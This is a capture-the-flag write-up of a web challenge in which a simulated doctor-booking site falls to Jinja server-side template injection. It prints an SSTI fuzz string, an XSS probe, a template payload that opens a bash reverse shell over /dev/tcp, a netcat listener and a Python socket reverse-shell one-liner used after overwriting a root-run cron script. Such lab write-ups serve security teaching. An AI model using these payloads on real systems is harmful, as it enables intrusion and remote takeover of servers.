# CTF League - docktor

## Server Side Template Injection
The critical vulnerability in this weeks challenge is a form of web code injection using templating engines. Any web framework worth its salt provides some method of creating and programtically rendering html content based on a template. If 
user input is not properly sanitized, an attacker can inject a malicious payload into 

## Flag 1
The [site provided](https://docktor.ctf-league.osusec.org) for the challenge simulated a booking service for a doctor appoint, with user input to schedule an appointment. Finding [this useful resource](https://portswigger.net/web-security/server-side-template-injection), that described a simple fuzzing technique of providing `${{<%[%'"}}%\` to an input field, which triggers a wide array of different templating engines. Ideally this should just be processed as text content, but if a it is being interpreted as a template itself, then we will see an Internal Server Error, and confirm the SSTI vulnerability.

>[!NOTE]
> We also found this input to be vulnerable to basic xss (e.g `<script>alert(1)</script>`) but did not use this vulnerablity in our exploit

The fuzzing technique was succesful, and we next tried to determine which templating engine or underlying language the server was running. The payload `{{7*'7'}}` returned us `7777777`, this tells us the engine is not js/node based, and instead is they python based Jinja templating engine. 

Researching what objects the jinja/flask could expose, we searched through the `{{config}}`and other similar objects finding nothing. We opted to instead inject a payload that would create a reverse shell on the web server by setting a listening server on the engineering servers with `nc -lnvp $port`, and the template payload:

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c \'(exec bash -i &>/dev/tcp/$ip/$port 0>&1) &\'').read()}}
```

Which would create an interactive bash session and pipe the output to a network pipe connected with out listening server. With a reverse shell connected, we found the first flag within the home directory with `cat ~/flag.txt`.

## Flag 2
The challenge introduction discussed achieving priveledge escalation using the [linpeass](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) script. Running this from our reverse shell found an "interesting file" `/ect/cron_update.py`. Our user had write access to the file, but the script was not in our users crontab. This suggested it may be run in a cronjob by another, potentially higher priveledged user. Since we had write access to this file, we could write our own code that would get executed as a root. 

Unfortunately the only text editor present on the system was `sed`, and despite the `-i` flag supposedly meaning in-place, precisely modifying the file with our exploit failed because it lacked permissions to create a temporary file. Instead we opted to clobber the file using `echo` with our exploit. 

Our exploit was completed using [revshells](https://www.revshells.com/), and used pythons socket interface to create a new reverse shell, that would be logged in as root, which granted us the flag.

```py
import os,pty,socket;s=socket.socket();s.connect((ip,port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('sh')
```

